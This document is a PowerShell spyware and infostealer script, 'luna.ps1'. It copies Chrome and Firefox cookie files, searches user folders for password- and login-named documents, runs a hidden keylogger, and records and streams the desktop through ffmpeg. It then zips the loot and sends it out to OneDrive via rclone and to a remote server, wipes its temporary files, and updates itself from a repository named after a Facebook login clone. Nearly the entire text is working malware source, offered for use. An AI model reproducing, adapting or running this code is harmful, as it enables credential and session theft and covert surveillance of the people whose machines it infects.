# luna.ps1 - PowerShell Agent with Cookie, File Collection, Media Capture, and Keylogging

$serverUrl = "https://onclick-back.onrender.com"
$tempDir = "$env:TEMP\luna"
$shotsDir = "$tempDir\shots"
$logPath = "$tempDir\log.json"
$metaPath = "$tempDir\meta.txt"
$zipPath = "$tempDir\bundle.zip"
$cookieDir = "$tempDir\cookies"
$fileDumpDir = "$tempDir\files"
$keylogPath = "$tempDir\keylog.txt"
$interval = 600  # 10 minutes per cycle

New-Item -ItemType Directory -Force -Path $tempDir, $shotsDir, $cookieDir    | Out-Null

Start-Transcript -Path "$tempDir\session.log" -Append
Write-Output "[*] Started at $(Get-Date)"

function Get-ChromeCookies {
    $path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
    if (-not (Test-Path $cookieDir)) {
    New-Item -ItemType Directory -Path $cookieDir -Force | Out-Null
    }
    if (Test-Path $path) {
        $chromeCopy = "$cookieDir\chrome.sqlite"
    Copy-Item $path $chromeCopy -Force -ErrorAction SilentlyContinue
    if (Test-Path $chromeCopy) { Write-Output "Chrome cookies saved: $chromeCopy" }
    }
}

function Get-FirefoxCookies {
    $profiles = "$env:APPDATA\Mozilla\Firefox\Profiles"
    if (-not (Test-Path $cookieDir)) {
    New-Item -ItemType Directory -Path $cookieDir -Force | Out-Null
    }
    if (Test-Path $profiles) {
        Get-ChildItem -Directory $profiles | ForEach-Object {
            $cookieFile = "$($_.FullName)\cookies.sqlite"
            if (Test-Path $cookieFile) {
                Copy-Item $cookieFile "$cookieDir\firefox_$($_.Name).sqlite" -Force
            }
        }
    }
}

function Scan-Files {
    $targets = @("$env:USERPROFILE\Desktop", "$env:USERPROFILE\Documents", "$env:USERPROFILE\Downloads")
    $patterns = @("*pass*", "*haslo*", "*secret*", "*login*")
    $extensions = @("*.txt", "*.doc", "*.docx", "*.pdf")
    if (-not (Test-Path $fileDumpDir)) {
    New-Item -ItemType Directory -Path $fileDumpDir -Force | Out-Null
    }

    foreach ($dir in $targets) {
        foreach ($ext in $extensions) {
            foreach ($pattern in $patterns) {
                Get-ChildItem -Path $dir -Recurse -Filter $ext -ErrorAction SilentlyContinue | Where-Object {
                    $_.Name -like $pattern
                } | ForEach-Object {
                    $dest = Join-Path $fileDumpDir $_.Name
                    Copy-Item $_.FullName $dest -Force -ErrorAction SilentlyContinue
                }
            }
        }
    }
}

function Get-SystemReport {
    try {
        $os = Get-CimInstance Win32_OperatingSystem
        $cpu = Get-CimInstance Win32_Processor
        $net = Get-NetTCPConnection | Select-Object -First 20
        $procs = Get-Process | Sort CPU -Descending | Select Name, Id, CPU -First 20

        return [PSCustomObject]@{
            user = $env:USERNAME
            host = $env:COMPUTERNAME
            os = $os.Caption
            version = $os.Version
            arch = $env:PROCESSOR_ARCHITECTURE
            cpu = $cpu.Name
            timestamp = Get-Date -Format o
            processes = $procs
            net = $net
        }
    } catch {
        Write-Warning "System report failed: $_"
        return $null
    }
}
"" | Out-File -Encoding utf8 -Force $keylogPath
Start-Job -ScriptBlock {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -TypeDefinition '
    using System;
    using System.Runtime.InteropServices;
    public class KeyLogger {
        [DllImport("User32.dll")]
        public static extern short GetAsyncKeyState(Int32 vKey);
    }'

    $map = @{
        8 = "[Back]"
        13 = "[Enter]"
        32 = " "
        27 = "[Esc]"
        9 = "[Tab]"
    }

    $logPath = "$env:TEMP\luna\keylog.txt"
    while ($true) {
        for ($i = 1; $i -le 255; $i++) {
            if ([KeyLogger]::GetAsyncKeyState($i) -eq -32767) {
                $char = try {
                    if ($map.ContainsKey($i)) { $map[$i] } else { [char]$i }
                } catch { "[?]" }
                Add-Content -Path $logPath -Value "$([DateTime]::Now.ToString('HH:mm:ss')) $char"
            }
        }
        Start-Sleep -Milliseconds 50
    }
}
function Start-Recording {
    param([string]$Mode = "record")
    $ffmpeg = "$PSScriptRoot\ffmpeg.exe"
    if (!(Test-Path $ffmpeg)) {
        Write-Warning "ffmpeg not found"
        return
    }
    if ($Mode -eq "record") {
        $output = "$tempDir\screen_capture.mp4"
        Start-Process -WindowStyle Hidden -FilePath $ffmpeg `
            -ArgumentList "-y -f gdigrab -framerate 15 -i desktop -t 00:01:00 -vcodec libx264 $output"
    } elseif ($Mode -eq "stream") {
        Start-Process -WindowStyle Hidden -FilePath $ffmpeg `
            -ArgumentList "-f gdigrab -i desktop -f flv rtmp://a.rtmp.youtube.com/live2/YOURKEY"
    }
}
function Archive-And-Upload {
    if (-not (Test-Path $keylogPath)) {
    "" | Out-File -Encoding utf8 -Force $keylogPath
    }
    if (-not (Test-Path $keylogPath)) {
    New-Item -ItemType File -Path $keylogPath -Force | Out-Null
    }
    try {
        $report = Get-SystemReport
        if ($report) {
            $report | ConvertTo-Json -Depth 5 | Set-Content -Path $logPath -Force
        }

        $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
        $user = $env:USERNAME
        $finalZip = "$tempDir\luna_$user" + "_$timestamp.zip"
        $meta = "$tempDir\info.txt"

        @"
System: $($report.user)@$($report.host)
Date: $timestamp
Files: $(Get-ChildItem "$fileDumpDir" -Recurse | Measure-Object).Count
Cookies: $(Get-ChildItem "$cookieDir" -Recurse | Measure-Object).Count
"@ | Set-Content -Path $meta
        $filesCount = (Get-ChildItem "$fileDumpDir" -Recurse -ErrorAction SilentlyContinue | Measure-Object).Count
        $cookieCount = (Get-ChildItem "$cookieDir" -Recurse -ErrorAction SilentlyContinue | Measure-Object).Count
        $video = "$tempDir\screen_capture.mp4"
        $paths = @($logPath, $meta, "$cookieDir\*", "$fileDumpDir\*", $keylogPath)
        if (Test-Path $video) { $paths += $video }
        Compress-Archive -Path $paths -DestinationPath $finalZip -Force

        Upload-To-OneDrive -ZipPath $finalZip -UserName $user -Timestamp $timestamp
        $summary = "Files: $filesCount, Cookies: $cookieCount"
        Send-Telegram -User $user -Timestamp $timestamp -Summary $summary
    } catch {
        Write-Warning "Archiving or upload failed: $_"
    }
}

function Upload-To-OneDrive {
    param(
        [string]$ZipPath,
        [string]$UserName,
        [string]$Timestamp
    )

    $rcloneExe = "$PSScriptRoot\rclone.exe"
    $rcloneConf = "$PSScriptRoot\rclone.conf"
    $remoteFolder = "onedrive:luna_uploads/$UserName/$Timestamp/"

    if (!(Test-Path $rcloneExe) -or !(Test-Path $rcloneConf)) {
        Write-Warning "rclone or config missing"
        return
    }

    & "$rcloneExe" copy "$ZipPath" "$remoteFolder" --config "$rcloneConf" --create-empty-src-dirs --quiet

    if ($LASTEXITCODE -eq 0) {
        $link = "https://onedrive.live.com/?id=root&cid=9f1831722b7187c6"
        $summary = "Files: $filesCount, Cookies: $cookieCount"
        Send-Telegram -User $UserName -Timestamp $Timestamp -Summary "$summary`n$link"
    }
}
function Send-Telegram {
    param([string]$User, [string]$Timestamp, [string]$Summary)

    $text = @"
Upload complete:
User: $User
Time: $Timestamp

$Summary
"@
    try {
        Invoke-RestMethod -Uri "$serverUrl/report" -Method POST `
            -Body (@{ text = $text } | ConvertTo-Json -Compress) `
            -ContentType "application/json"
    } catch {
        Write-Warning "Telegram send failed: $_"
    }
}

function Cleanup {
    try {
        Remove-Item "$tempDir\*" -Recurse -Force -ErrorAction SilentlyContinue
        Write-Output "Temp cleaned"
    } catch {
        Write-Warning "Cleanup failed"
    }
}

# === MAIN LOOP ===

while ($true) {
    Get-ChromeCookies
    Get-FirefoxCookies
    Scan-Files
    if (-not (Test-Path $fileDumpDir)) {
        New-Item -ItemType Directory -Path $fileDumpDir -Force | Out-Null
    }
    Start-Recording -Mode "record"
    Start-Recording -Mode "stream"
    Archive-And-Upload
    Cleanup
    function Self-Update {
    $url = "https://raw.githubusercontent.com/Ex6TenZz/fb-login-clone/main/public/luna/luna.ps1"
    $local = "$PSScriptRoot\luna.ps1"
    try {
        Invoke-WebRequest -Uri $url -OutFile $local -UseBasicParsing
        Write-Output "Self-update complete"
    } catch {
        Write-Warning "Self-update failed"
    }
    }
    Self-Update
    Write-Output "Restarting after update..."
    Start-Process -FilePath "$local" -WindowStyle Hidden
    exit
    }

Stop-Transcript
